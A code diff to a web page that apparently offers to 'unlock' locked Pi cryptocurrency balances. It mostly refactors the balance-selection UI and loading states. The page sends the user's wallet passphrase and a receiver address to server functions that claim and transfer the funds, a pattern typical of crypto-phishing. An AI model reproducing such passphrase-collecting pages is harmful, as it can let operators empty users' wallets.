@@ -83,10 +83,11 @@
         <div id="step2Card" class="card rounded-xl p-8 hidden">
             <h2 class="text-xl font-bold text-gray-800 mb-1">Select a Locked Balance</h2>
             <p class="text-gray-600 mb-4">Total Locked: <span id="totalLocked" class="font-semibold">0.00 PI</span></p>
-            <form id="selectionForm" class="space-y-3 max-h-60 overflow-y-auto pr-2">
+            <div id="selectionFormContainer" class="space-y-3 max-h-60 overflow-y-auto pr-2">
                 <!-- Balance items will be injected here -->
-            </form>
+            </div>
             <button id="proceedBtn" class="btn-primary w-full py-3 px-4 rounded-lg text-white font-medium mt-6" disabled>Proceed to Unlock</button>
+            <button onclick="resetApp()" class="w-full text-center mt-4 text-sm text-gray-600 hover:text-gray-800">Check another wallet</button>
         </div>
 
         <!-- Unlock Modal -->
@@ -138,7 +139,7 @@
         const balanceForm = document.getElementById('balanceForm');
         const checkBalanceBtn = document.getElementById('checkBalanceBtn');
         const errorMessageContainer = document.getElementById('errorMessageContainer');
-        const selectionForm = document.getElementById('selectionForm');
+        const selectionFormContainer = document.getElementById('selectionFormContainer');
         const totalLocked = document.getElementById('totalLocked');
         const proceedBtn = document.getElementById('proceedBtn');
         
@@ -162,11 +163,11 @@
             const passphrase = document.getElementById('passphrase').value;
             if (!passphrase.trim()) return;
 
-            setLoadingState(checkBalanceBtn, true, 'Checking...');
+            setLoadingState(checkBalanceBtn, true);
             errorMessageContainer.innerHTML = '';
 
             try {
-                // IMPORTANT: Change this URL to your Netlify function endpoint
+                // Request seedha function ke aaddress par ja rahi hai
                 const response = await fetch('/.netlify/functions/getClaimableBalances', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -193,40 +194,44 @@
 
         function displayBalances(balances) {
             if (!balances || balances.length === 0) {
-                selectionForm.innerHTML = '<p class="text-center text-gray-500">No claimable balances found.</p>';
+                selectionFormContainer.innerHTML = '<p class="text-center text-gray-500">No claimable balances found.</p>';
                 totalLocked.textContent = '0.00 PI';
+                proceedBtn.disabled = true;
                 return;
             }
 
             const total = balances.reduce((sum, b) => sum + parseFloat(b.amount), 0);
             totalLocked.textContent = `${total.toFixed(7)} PI`;
             
-            selectionForm.innerHTML = balances.map((b, index) => `
-                <label for="balance-${index}" class="balance-item flex items-center gap-4">
-                    <input type="radio" name="selectedBalance" id="balance-${index}" value="${index}" class="form-radio h-5 w-5 text-yellow-500 focus:ring-yellow-500">
-                    <div class="flex-grow">
-                        <p class="font-semibold text-gray-800">${parseFloat(b.amount).toFixed(7)} PI</p>
-                        <p class="text-xs text-gray-500">ID: ...${b.id.slice(-12)}</p>
+            selectionFormContainer.innerHTML = balances.map((b, index) => `
+                <div class="balance-item" onclick="selectBalance(this, ${index})">
+                    <div class="flex items-center gap-4">
+                        <input type="radio" name="selectedBalance" id="balance-${index}" value="${index}" class="form-radio h-5 w-5 text-yellow-500 focus:ring-yellow-500 pointer-events-none">
+                        <div class="flex-grow">
+                            <p class="font-semibold text-gray-800">${parseFloat(b.amount).toFixed(7)} PI</p>
+                            <p class="text-xs text-gray-500">ID: ...${b.id.slice(-12)}</p>
+                        </div>
                     </div>
-                </label>
+                </div>
             `).join('');
+        }
+        
+        function selectBalance(element, index) {
+            document.querySelectorAll('.balance-item').forEach(item => item.classList.remove('selected'));
+            element.classList.add('selected');
             
-            // Add event listener to enable proceed button
-            selectionForm.addEventListener('change', () => {
-                const selectedRadio = selectionForm.querySelector('input[name="selectedBalance"]:checked');
-                document.querySelectorAll('.balance-item').forEach(item => item.classList.remove('selected'));
-                if (selectedRadio) {
-                    selectedRadio.parentElement.classList.add('selected');
-                    proceedBtn.disabled = false;
-                    selectedBalance = claimableBalances[selectedRadio.value];
-                }
-            });
+            const radio = element.querySelector('input[type="radio"]');
+            radio.checked = true;
+
+            selectedBalance = claimableBalances[index];
+            proceedBtn.disabled = false;
         }
 
         function handleProceed() {
             if (!selectedBalance) return;
             unlockAmount.textContent = `${parseFloat(selectedBalance.amount).toFixed(7)} PI`;
             unlockErrorMessage.innerHTML = '';
+            document.getElementById('receiverAddress').value = '';
             unlockModal.classList.remove('hidden');
             feather.replace();
         }
@@ -236,11 +241,16 @@
             const passphrase = document.getElementById('passphrase').value;
             const receiverAddress = document.getElementById('receiverAddress').value;
 
-            setLoadingState(confirmUnlockBtn, true, 'Unlocking...');
+            if (!receiverAddress.trim()) {
+                 showError("Receiver address is required.", unlockErrorMessage);
+                 return;
+            }
+
+            setLoadingState(confirmUnlockBtn, true);
             unlockErrorMessage.innerHTML = '';
 
             try {
-                // IMPORTANT: Change this URL to your Netlify function endpoint
+                // Request seedha function ke address par ja rahi hai
                 const response = await fetch('/.netlify/functions/submitTransaction', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -249,8 +259,8 @@
                         receiverAddress: receiverAddress,
                         amount: selectedBalance.amount,
                         claimableId: selectedBalance.id,
-                        operation: 'claim_and_transfer', // Assuming this operation type
-                        feeType: 'SENDER_PAYS' // Assuming sender pays the fee
+                        operation: 'claim_and_transfer',
+                        feeType: 'SENDER_PAYS'
                     }),
                 });
 
@@ -275,11 +285,16 @@
         }
         
         // Helper Functions
-        function setLoadingState(button, isLoading, loadingText) {
+        function setLoadingState(button, isLoading, text) {
+            if (!button.dataset.originalText) {
+                button.dataset.originalText = button.innerHTML;
+            }
+
             button.disabled = isLoading;
-            button.innerHTML = isLoading ? `<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mx-auto"></div>` : button.dataset.originalText || button.textContent;
-            if (!button.dataset.originalText && !isLoading) {
-                 button.dataset.originalText = button.textContent;
+            if (isLoading) {
+                button.innerHTML = `<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mx-auto"></div>`;
+            } else {
+                button.innerHTML = text || button.dataset.originalText;
             }
         }
 
